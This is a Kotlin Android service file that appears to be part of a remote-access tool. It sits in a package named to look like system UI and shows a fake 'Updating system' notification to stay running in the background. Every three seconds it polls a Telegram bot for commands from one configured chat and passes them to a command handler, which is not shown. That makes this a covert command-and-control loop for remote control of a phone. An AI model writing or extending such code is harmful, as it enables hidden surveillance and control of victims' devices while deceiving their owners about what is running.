package com.systemui.relay

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.*

class TelegramService : LifecycleService() {
    private var scope: CoroutineScope? = null
    private var lastUpdateId = 0L
    private var running = false

    companion object {
        const val CHANNEL_ID = "relay_channel"
        const val NOTIFICATION_ID = 1
        const val POLL_INTERVAL_MS = 3000L
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        super.onStartCommand(i, f, s)
        if (!running) {
            running = true
            startForeground(NOTIFICATION_ID, createNotification())
            scope = CoroutineScope(SupervisorJob() + Dispatchers.IO).apply {
                launch { pollLoop() }
            }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        running = false
        scope?.cancel()
        scope = null
        super.onDestroy()
    }

    override fun onBind(i: Intent): IBinder? {
        super.onBind(i)
        return null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                CHANNEL_ID,
                "Device Relay",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Updating system"
                setShowBadge(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pending = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Updating system")
            .setContentText("System update in progress...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setContentIntent(pending)
            .build()
    }

    private suspend fun pollLoop() {
        while (running) {
            try {
                val updates = TelegramApi.getUpdates(lastUpdateId + 1)
                for (u in updates) {
                    if (u.chatId == Config.CHAT_ID) {
                        Log.d("DeviceRelay", "Command: ${u.text}")
                        CommandHandler.handle(this@TelegramService, u.text)
                    }
                    if (u.updateId > lastUpdateId) {
                        lastUpdateId = u.updateId
                    }
                }
            } catch (e: Exception) {
                Log.e("DeviceRelay", "poll error", e)
            }
            delay(POLL_INTERVAL_MS)
        }
    }
}